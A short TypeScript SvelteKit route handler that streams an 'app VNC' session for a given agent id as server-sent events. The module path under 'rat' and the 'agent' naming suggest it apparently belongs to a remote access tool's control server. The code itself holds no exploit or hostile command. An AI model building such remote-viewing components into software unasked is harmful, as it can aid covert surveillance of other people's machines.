import type { RequestHandler } from './$types';
import { error } from '@sveltejs/kit';
import { appVncManager } from '$lib/server/rat/app-vnc';

export const GET: RequestHandler = ({ params, url, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const sessionId = url.searchParams.get('sessionId') ?? undefined;
	const stream = appVncManager.subscribe(id, sessionId);

	const abort = request.signal;
	abort.addEventListener(
		'abort',
		() => {
			stream.cancel().catch(() => {
				// ignore
			});
		},
		{ once: true }
	);

	return new Response(stream, {
		headers: {
			'Content-Type': 'text/event-stream',
			'Cache-Control': 'no-cache',
			Connection: 'keep-alive'
		}
	});
};
